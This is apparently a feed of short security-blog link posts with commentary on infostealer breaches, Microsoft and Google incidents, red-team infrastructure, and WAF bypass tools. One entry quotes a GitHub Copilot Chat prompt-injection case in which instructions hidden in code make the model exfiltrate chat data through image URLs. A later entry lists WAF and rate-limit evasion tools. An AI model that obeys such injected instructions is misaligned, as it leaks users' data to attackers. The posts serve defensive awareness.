&lt;p&gt;Infostealers are growing in popularity over the years and rapidly growing due to malware-as-a-service offerings. It is as simple as generate a payload and fire it off via email or host it on an endpoint. The main purpose of this type of malware is about data exfiltration of sensitive data as fast as they can before it&#x27;s detected by AV&#x2F;EDR. You only need to be right once and unsophisticated adversaries wouldn&#x27;t care if the payload has been detected, they have the data they wanted and it&#x27;s going to be sold in bulk on the dark web. Whether the compromised organization has the ability to identify and deal with such situations can be a crap shoot (lack of expertise) and that&#x27;s what unsophisicated adveraries are banking on. If you don&#x27;t take action on it, it&#x27;s a matter of time someone will be purchasing bulk credentials and try it out.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;The hacker says the credentials were stored on the worker’s machine in a project management tool called Jira.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Of course, we all do 😅 &#x2F;s&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Snowflake accounts didn’t require multifactor authentication (MFA) to access them.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;And this is the downfall for Snowflake and it&#x27;s customers. It should&#x27;ve been enforced right from the get go. Instead, I&#x27;m guessing Snowflake made it optional and companies who used their service did not perform a third-party risk assessment before going into production. IMO both parties are to blame here.&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;But in cases where Snowflake credentials weren’t stored on the worker’s system, the hacker claims they sifted through stockpiles of old credentials stolen in previous breaches by hackers using infostealer malware and found additional usernames and passwords for Snowflake accounts&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Mandiant said that about 80 percent of the victims it identified in the Snowflake campaign were compromised using credentials that had previously been stolen and exposed by infostealers.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Mandiant suggested that multiple contractors were breached to gain access to Snowflake accounts, noting that contractors—often known as business process outsourcing (BPO) companies—are a potential gold mine for hackers&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;noting that the majority of the credentials the hackers used in the Snowflake campaign came from repositories of data previously stolen by various infostealer campaigns, some of which dated as far back as 2020.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;This won&#x27;t be the last story we will hear about compromising contractors as a way to gain initial access to a company they are working for. From what I can recall, the last major story was &lt;a href=&quot;https:&#x2F;&#x2F;krebsonsecurity.com&#x2F;2014&#x2F;02&#x2F;target-hackers-broke-in-via-hvac-company&#x2F;&quot;&gt;Target&lt;&#x2F;a&gt; being compromised via HVAC company. This is why segregation and defense in depth is important and not an after thought.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Cyber Scarecrow: A Better Trap?</title>
        <published>2024-06-18T00:00:00+00:00</published>
        <updated>2024-06-18T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/scarecrow/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/scarecrow/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.cyberscarecrow.com&#x2F;&quot;&gt;Cyber Scarecrow&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;When hackers install malicious software on a compromised victim, they first check to make sure its safe for them to run. They don&#x27;t want to get caught and avoid computers that have security analysis or anti-malware tools on them.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Scarecrow takes advantage of this, by running in the background of your computer and &#x27;faking&#x27; these indicators. It&#x27;s super lightweight and tricks malware into thinking your computer is not the place for them to be.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Not exactly a new &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;NavyTitanium&#x2F;Fake-Sandbox-Artifacts&quot;&gt;idea&lt;&#x2F;a&gt; but interesting to see how the end user market responds to such a product. From a professional perspective, I wouldn&#x27;t run this tool and I don&#x27;t even know who they are so this product needs to build trust first. They should get this backed by a reputable organization or maybe release an opensource solution with a paid version of some kind. Ultimately, this solution is still a cat and mouse game of who can build a better trap but maybe raising the difficulty bar against adversaries is a good thing? Hard to say.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>From Prompt Injection to Data Exfiltration</title>
        <published>2024-06-17T00:00:00+00:00</published>
        <updated>2024-06-17T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/llm-chat-to-data-exfil/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/llm-chat-to-data-exfil/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;embracethered.com&#x2F;blog&#x2F;posts&#x2F;2024&#x2F;github-copilot-chat-prompt-injection-data-exfiltration&#x2F;&quot;&gt;GitHub Copilot Chat: From Prompt Injection to Data Exfiltration&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;GitHub Copilot Chat VS Code Extension was vulnerable to data exfiltration via prompt injection when analyzing untrusted source code.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;This means that using carefully crafted instructions in a source code file, an attacker can cause the LLM to return hyperlinks to images which will then be automatically retrieved. This outbound image retrieval request can be used to exfiltrate data by having the LLM append additional information from the chat context as a query parameter.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;An attacker can access the previous conversation turns and append information from the chat history to an image URL. When Copilot renders the HTML and the image URL, the data is sent to the attacker.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;I&#x27;ve been seeing this similar vulnerability across custom rolled plugins or internally built LLM client interfaces that support any models under the sun. Consider this attack vector when reviewing and testing LLM applications.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Microsoft Chooses Profit over Security</title>
        <published>2024-06-16T00:00:00+00:00</published>
        <updated>2024-06-16T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/microsoft-golden-saml/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/microsoft-golden-saml/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.propublica.org&#x2F;article&#x2F;microsoft-solarwinds-golden-saml-data-breach-russian-hackers&quot;&gt;Microsoft Chose Profit Over Security and Left U.S. Government Vulnerable to Russian Hack, Whistleblower Says&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;The product, which was used by millions of people to log on to their work computers, contained a flaw that could allow attackers to masquerade as legitimate employees and rummage through victims’ “crown jewels” — national security secrets, corporate intellectual property, embarrassing personal emails — all without tripping alarms.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;But Harris was most concerned about the federal government and the implications of his discovery for national security. He flagged the issue to his colleagues.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;They saw it differently, Harris said. The federal government was preparing to make a massive investment in cloud computing, and Microsoft wanted the business. Acknowledging this security flaw could jeopardize the company’s chances, Harris recalled one product leader telling him. The financial consequences were enormous. Not only could Microsoft lose a multibillion-dollar deal, but it could also lose the race to dominate the market for cloud computing.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Frustrated by Microsoft’s inaction, he left the company in August 2020.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Within months, his fears became reality. U.S. officials confirmed reports that a state-sponsored team of Russian hackers had carried out SolarWinds, one of the largest cyberattacks in U.S. history.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;The perspective changed once Solarwinds incident happened and &lt;a href=&quot;https:&#x2F;&#x2F;techcrunch.com&#x2F;2023&#x2F;07&#x2F;17&#x2F;microsoft-lost-keys-government-hacked&#x2F;&quot;&gt;another&lt;&#x2F;a&gt; with the stolen MSA key that allows access to any enterprise mailbox. This cascade of incidents lead to a response of internal culture shift on focusing security first but we all know how that will go, culture is not cultivated overnight. As an example, the initial impressions of the new Recall feature was under heavy scrutiny due to the lack of security features by storing sensitive data in an unencrypted SQLite. Although, it was an pre-release ARM version of Recall but these design choices are not forgivable if security needs to be prioritized. I get it, doing actual security work does take time and money but it&#x27;s more important than ever in this digital age.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Infrastructure as Code for Red Teamers</title>
        <published>2024-06-15T00:00:00+00:00</published>
        <updated>2024-06-15T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/redteam-iaac/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/redteam-iaac/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;bluscreenofjeff&#x2F;Red-Team-Infrastructure-Wiki&quot;&gt;Red Team Infrastructure Wiki&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Prior before starting a new red team engagement, there are plenty of infrastructure setup that is required to prepare for engagements. The process is always the same as you can see in the link above. There are a lot of moving pieces like setting up the C2 network, redirectors, proxies, phishing, domains, and etc. For every component, there is a custom configuration that may be required. This can be difficult to track and doing this all manually is a repetitive chore.&lt;&#x2F;p&gt;
&lt;p&gt;Modern sysadmin&#x2F;devops teams encounter the same issues but they are smarter than us by using tools like &lt;a href=&quot;https:&#x2F;&#x2F;www.packer.io&#x2F;&quot;&gt;packer&lt;&#x2F;a&gt;, &lt;a href=&quot;https:&#x2F;&#x2F;www.terraform.io&#x2F;&quot;&gt;terraform&lt;&#x2F;a&gt;, and &lt;a href=&quot;https:&#x2F;&#x2F;www.ansible.com&#x2F;&quot;&gt;ansible&lt;&#x2F;a&gt;. These set of tools help with the provisioning the infrastructure in a quick, iterative, and consistent fashion. There is too much info to dive deep into these three tools in this single post but here is the general idea.&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Packer can help with creating a custom &amp;quot;gold&amp;quot; image of which you can load up tools&#x2F;scripts&#x2F;settings preloaded so you don&#x27;t need to.&lt;&#x2F;li&gt;
&lt;li&gt;Terraform can help with provisioning the images that you created with packer by deploying on whatever platform you end up using, it can be cloud or on-premise hardware, it doesn&#x27;t matter as long as there is a supported terraform script that interfaces with the platform&#x27;s API.&lt;&#x2F;li&gt;
&lt;li&gt;Finally with Ansible, it can help with logging into the newly setup VMs that is created by terraform via SSH and start executing commands that you generally perform when you first setup a host. For example, adding new users, setting up SSH keys, configuring apache modules, running package updates, and etc.&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;Learning and understanding these three tools does take some time but it will pay off in the end as you can also easily offload this task to anyone. Quite frankly, any red teamer worth their salt should know how their operational security and infrastructure works. The best way to learn is by writing IaaC scripts and track changes as you develop the core components. Take a peek at this simple &lt;a href=&quot;https:&#x2F;&#x2F;www.detectionlab.network&#x2F;deployment&#x2F;azure&#x2F;&quot;&gt;example&lt;&#x2F;a&gt; to get an fundamental idea of how components are put together.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Malpedia: Malware Identification</title>
        <published>2024-06-14T00:00:00+00:00</published>
        <updated>2024-06-14T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/malpedia/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/malpedia/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;malpedia.caad.fkie.fraunhofer.de&#x2F;library&quot;&gt;Malpedia&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Wow, how did I not know about this earlier? This saves a lot of time looking into attack paths to mimic and remix as my own.&lt;&#x2F;p&gt;
&lt;p&gt;Comparing to my custom threat intelligence reports that I receive on a daily basis, this is better for actionable items rather than high level summary of active APTs. Which is fine because not everyone needs to know the technical details of what the attack paths, opsec, and targets look like. For those aspiring red teamers, you will need to understand how the threat actors operate in order to mimic the TTPs and measure the risk results based on the organization security controls. The fun part from all of this is remixing with your own style based on your strengths. You be surprised how fast you can learn, pivot, and discover along the way. You end up having a stockpile of hacky scripts that can be reused or remixed again.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>China&#x27;s Cyber Ecosystem and Hacking Scene</title>
        <published>2024-06-13T00:00:00+00:00</published>
        <updated>2024-06-13T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/china-cyber-ecosystem/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/china-cyber-ecosystem/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;news.risky.biz&#x2F;how-chinas-cyber-ecosystem-feeds-off-its-superstar-hackers&quot;&gt;How China’s Cyber Ecosystem Feeds Off Its Superstar Hackers&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;The report pulls together information made public over the past several years to comprehensively summarise evidence the PRC funnels vulnerability research into state-sponsored espionage efforts.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;The report says companies linked to Chinese state-sponsored cyber operations sponsor hacking competitions. Security firm Topsec, which has been linked to the 2015 breach of US insurance giant Anthem, sponsors the Tianfu Cup. And the i-SOON cyber espionage contracting firm created the &#x27;Anxun Cup&#x27; hacking competition to attract talent. &lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;The Chinese government also has regulations which mandate that vulnerability disclosure information be passed through official agencies that have links to the Ministry of State Security (see diagram below).&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;We&#x27;ve heard directly from individual Chinese security researchers that they are motivated to improve global security and not by nationalistic fervour. But it is not clear what elite hackers in general think about working for Chinese national security purposes.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;These elite hackers really matter. The report analysed the contribution Chinese researchers made to Google, Microsoft and Apple bug bounty programs, and found that a handful of individuals made an outsized contribution.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;An interesting observation in the report is that the hacking targets at the 2023 Tianfu Cup shifted away from Western products towards Chinese ones. The Chinese government is trying to reduce the country&#x27;s dependency on foreign software and hardware (known colloquially as &#x27;Delete America&#x27;), so a focus on domestic software makes sense to improve its resilience.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;It is worth remembering that the two examples we have where vulnerabilities were exploited shortly after disclosure at a conference or hacking contest have targeted two of the Chinese Communist Party&#x27;s &#x27;Five Poisons&#x27;—Hong Kong pro-democracy groups and Uyghur Muslims. (Tibetans, Taiwanese and the Falun Gong are the other three). &lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;&lt;img src=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;wiretap&#x2F;china-cyber-ecosystem&#x2F;ecosystem.png&quot; alt=&quot;ecosystem&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Great insight into how motivated state-sponsored actors are working behind the scenes. It&#x27;s not that it wasn&#x27;t known back in 2018 when the Chinese teams didn&#x27;t want to participate in US CTFs, we all saw this one coming when trade wars were heated between the two countries. Fast forward to today, as a result, we observed how the state-sponsored cyber attacks has progressed rapidly with sophistication and stock piles of N&#x2F;0-days ready to be weaponized and deployed. The sad reality of all this is technology being used against oppressed minorities and certain human rights groups to further push forward the nation&#x27;s unified agenda.&lt;&#x2F;p&gt;
&lt;p&gt;Over the past decade of reading and peering into the Chinese patriotic hacking scene, there are a lot commercially driven groups and individuals willing to accept funds for farmed out operations. Some will be sloppy and others can be great but I don&#x27;t think the state is concerned about opsec for farmed out operations. The outsourcing of work to lower tier groups&#x2F;individuals are about gathering intelligence and recon of data. Not only does this not directly link to the Chinese government but acts as a proxy and there are tons of them around. This creates a thriving underground ecosystem that is able to recruit the talented into state-sponsored espionage missions. This all sounds like a spy movie but it&#x27;s real.. and with real stakes involved.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Tales of the Breach with Field CISO</title>
        <published>2024-06-12T00:00:00+00:00</published>
        <updated>2024-06-12T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/tales-of-the-breach/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/tales-of-the-breach/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;streamyard.com&#x2F;watch&#x2F;W46eD36gq2a9&quot;&gt;Tales of the Breach With Field CISO Jason Haddix&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Thoughts and takeaways:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;Almost 40% of breaches are started by leaked credentials found offered on the dark web. 18% of breaches came from phishing and 18% came from exploit of vulnerabilities.&lt;&#x2F;li&gt;
&lt;li&gt;Most modern threat actors don&#x27;t bother with sophisticated attacks that can trigger EDR&#x2F;AV. What they do most is searching through applications that has web interfaces which mean hiding within HTTP(S) traffic as long as possible. This is why I tend to preach the idea of building payloads around reverse proxying a network connection to understand the lay of the land. In my experience, it&#x27;s easier to sneak by on the network level rather than splintering off unusual processes.&lt;&#x2F;li&gt;
&lt;li&gt;The presenter categorized levels of sophisication and order of operations based on the threat actor. It ranges from skiddies searching or buying fresh creds, adversaries performing AitM, N&#x2F;0-day exploits, and the hardest to detect of them all is insider threats.&lt;&#x2F;li&gt;
&lt;li&gt;Threat actors are looking through various management software and knowledge bases to understand what is available to them and see if there are hardcoded credentials that can be further leveraged. Items that are being targeted: knowledge bases, dev and project management, SCM, code repositories, build servers, dev platforms, config managerment, operations and monitoring, IaaC platforms, and secrets managers. Most of these has some form of web interface or knowledge has been dumped cleartext into a readable knowledge base for everyone to read. Believe me, it happens more than you think.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;fastfire&#x2F;deepdarkCTI&quot;&gt;deepdarkCTI&lt;&#x2F;a&gt; - Collection of Cyber Threat Intelligence sources from the Deep and Dark Web. Kudos to all the CTI spies that keep this fresh as possible, it&#x27;s not easy at all.&lt;&#x2F;li&gt;
&lt;li&gt;Airgap your DCJs, nuff said..&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Google Leak Reveals Thousands of Privacy Incidents</title>
        <published>2024-06-11T00:00:00+00:00</published>
        <updated>2024-06-11T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/google-leak-privacy-incidents/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/google-leak-privacy-incidents/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.404media.co&#x2F;google-leak-reveals-thousands-of-privacy-incidents&#x2F;&quot;&gt;Google Leak Reveals Thousands of Privacy Incidents&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Google has accidentally collected childrens’ voice data, leaked the trips and home addresses of car pool users, and made YouTube recommendations based on users’ deleted watch history, among thousands of other employee-reported privacy incidents&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Individually the incidents, most of which have not been previously publicly reported, may only each impact a relatively small number of people, or were fixed quickly&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;The data obtained by 404 Media includes privacy and security issues that Google’s own employees reported internally. These include issues with Google’s own products or data collection practices; vulnerabilities in third party vendors that Google uses; or mistakes made by Google staff, contractors, or other people that have impacted Google systems or data. The incidents include everything from a single errant email containing some PII, through to substantial leaks of data, right up to impending raids on Google offices. When reporting an incident, employees give the incident a priority rating, P0 being the highest, P1 being a step below that. The database contains thousands of reports over the course of six years, from 2013 to 2018.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;The reports obtained by 404 are from over six years ago and are examples of these flags—every one was reviewed and resolved at that time. In some cases, these employee flags turned out not to be issues at all or were issues that employees found in third party services.”&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;A quick glance of the collected issues appear to be grouped in the following: UX&#x2F;UI design issues, misconfiguration, faulty application logic, mergers and acquisitions gone wrong. Although across the board, some are quite bad and unsure if it was intentional or not such as:&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;YouTube made recommendations based on videos users had deleted from their watch history, which was against YouTube’s own policy.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Or..&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;A Google employee accessed private videos in Nintendo’s YouTube account, and leaked information ahead of Nintendo’s planned announcements. An internal interview concluded the activity was “non-intentional,” the report says.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;And that is the reason why I need to &lt;a href=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;wiretap&#x2F;how-to-quit-google&#x2F;&quot;&gt;DeGoogle&lt;&#x2F;a&gt; from their services.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Microsoft Recall Response to Criticism</title>
        <published>2024-06-10T00:00:00+00:00</published>
        <updated>2024-06-10T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/microsoft-recall-response/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/microsoft-recall-response/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;blogs.windows.com&#x2F;windowsexperience&#x2F;2024&#x2F;06&#x2F;07&#x2F;update-on-the-recall-preview-feature-for-copilot-pcs&#x2F;&quot;&gt;Update on the Recall preview feature for Copilot+ PCs&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Previous commentary:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;wiretap&#x2F;microsoft-recall&#x2F;&quot;&gt;Microsoft Recall: FML&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;johntuyen.com&#x2F;wiretap&#x2F;totalrecall-recall&#x2F;&quot;&gt;TotalRecall Recall is worst than I thought&lt;&#x2F;a&gt;&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;blockquote&gt;
&lt;p&gt;First, we are updating the set-up experience of Copilot+ PCs to give people a clearer choice to opt-in to saving snapshots using Recall. If you don’t proactively choose to turn it on, it will be off by default.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Second, Windows Hello enrollment is required to enable Recall. In addition, proof of presence is also required to view your timeline and search in Recall.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Recall snapshots will only be decrypted and accessible when the user authenticates. In addition, we encrypted the search index database.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Copilot+ PCs will launch with “just in time” decryption protected by Windows Hello Enhanced Sign-in Security (ESS), so Recall snapshots will only be decrypted and accessible when the user authenticates. This gives an additional layer of protection to Recall data in addition to other default enabled Window Security features like SmartScreen and Defender which use advanced AI techniques to help prevent malware from accessing data like Recall.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;Overall, decent response to address the critics about the security concerns. On the technical side of things, Windows Hello and ESS is a good choice and so far there aren&#x27;t any known attack vectors but it&#x27;s &lt;a href=&quot;https:&#x2F;&#x2F;blackwinghq.com&#x2F;blog&#x2F;posts&#x2F;a-touch-of-pwn-part-i&#x2F;&quot;&gt;not fully bulletproof&lt;&#x2F;a&gt; due to hardware vendors not complying with the &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;microsoft&#x2F;SecureDeviceConnectionProtocol&quot;&gt;SDCP&lt;&#x2F;a&gt; standard. &lt;&#x2F;p&gt;
&lt;p&gt;Lastly, with all this conundrum around privacy concerns, Microsoft should release a Windows version without all this Copilot AI bloatware. Although, I doubt this would happen considering the value it may bring to both parties. Similar to Windows 10&#x2F;11, power users are going to be running mandatory bloatware removal scripts when starting fresh but even then there is no guarantee that it won&#x27;t be enabled in the future updates.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>How to Quit Google</title>
        <published>2024-06-09T00:00:00+00:00</published>
        <updated>2024-06-09T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/how-to-quit-google/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/how-to-quit-google/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;lifehacker.com&#x2F;tech&#x2F;how-to-quit-google-according-to-a-privacy-expert&quot;&gt;How to Quit Google, According to a Privacy Expert&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;Don&#x27;t switch everything at once.&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;There are two things I wanted to get rid of for a long time, Gmail and Photos. Gmail will be tackled in a later post. I&#x27;ve been meaning to DeGoogle from Photos but haven&#x27;t found a good solution when I last checked years ago. As I&#x27;m nearing max storage limits once again, I took another glance at this problem. To my surprise, there are plenty of &lt;a href=&quot;https:&#x2F;&#x2F;meichthys.github.io&#x2F;foss_photo_libraries&#x2F;&quot;&gt;FOSS projects&lt;&#x2F;a&gt; to choose from. What caught my interest was this self-hosted project called &lt;a href=&quot;https:&#x2F;&#x2F;immich.app&#x2F;&quot;&gt;Immich&lt;&#x2F;a&gt;. It has everything I needed including backup features and web&#x2F;IOS application. The only problem I&#x27;m forseeing is getting the URL endpoint to be publicly accessible so I can sync photos while I&#x27;m away from home base. It would be foolish to open a public endpoint to my home IP and there is no reason to do so. Modern solutions like Cloudflare zero trust can provide additional layer of protection for sensitive services. For now, I&#x27;ll try this out as it meets most of my requirements and passes my sniff test.&lt;&#x2F;p&gt;
</content>
        
    </entry>
    <entry xml:lang="en">
        <title>Modern WAF Bypass Techniques</title>
        <published>2024-06-08T00:00:00+00:00</published>
        <updated>2024-06-08T00:00:00+00:00</updated>
        <author>
          <name>John Tuyen</name>
        </author>
        <link rel="alternate" href="https://johntuyen.com/wiretap/modern-waf-bypass/" type="text/html"/>
        <id>https://johntuyen.com/wiretap/modern-waf-bypass/</id>
        
        <content type="html">&lt;p&gt;&lt;a href=&quot;https:&#x2F;&#x2F;www.youtube.com&#x2F;watch?v=0OMmWtU2Y_g&quot;&gt;Modern WAF Bypass Techniques on Large Attack Surfaces&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;
&lt;p&gt;Takeaway and thoughts:&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;WAF Bypass Philosophy: simple bypasses are the best bypasses.&lt;&#x2F;li&gt;
&lt;li&gt;Increase of request size limits can almost always universally bypass WAFs due to the universal design decision.&lt;&#x2F;li&gt;
&lt;li&gt;The burp plugin &lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;assetnote&#x2F;nowafpls&quot;&gt;nowafpls&lt;&#x2F;a&gt; help pads HTTP requests to bypass WAF. Honestly, you can probably get away with Match and Replace feature.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;portswigger.net&#x2F;bappstore&#x2F;2eb2b1cb1cf34cc79cda36f0f9019874&quot;&gt;IP Rotate&lt;&#x2F;a&gt; burp plugin rotates IP addresses from multiple regions using API gateways which help with bypassing rate limiting protection features. This is a must have if you want to use intruder against a target.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;ustayready&#x2F;fireprox&quot;&gt;Fireprox&lt;&#x2F;a&gt; is similar to IP Rotate but a CLI version of which you can pipe in your other tools like &lt;code&gt;ffuf&lt;&#x2F;code&gt;.&lt;&#x2F;li&gt;
&lt;li&gt;&lt;a href=&quot;https:&#x2F;&#x2F;github.com&#x2F;fyoorer&#x2F;ShadowClone&quot;&gt;Shadowclone&lt;&#x2F;a&gt; this is a great tool and IMO the next gen of Axiom. No need to run heavy and slow VPS instances no more. Task distribution using serverless functions is more nimble, scalable, and cheaper to complete. With the free monthly compute usage that cloud providers hand out like candy, it&#x27;s simple to test out theories against targets.&lt;&#x2F;li&gt;
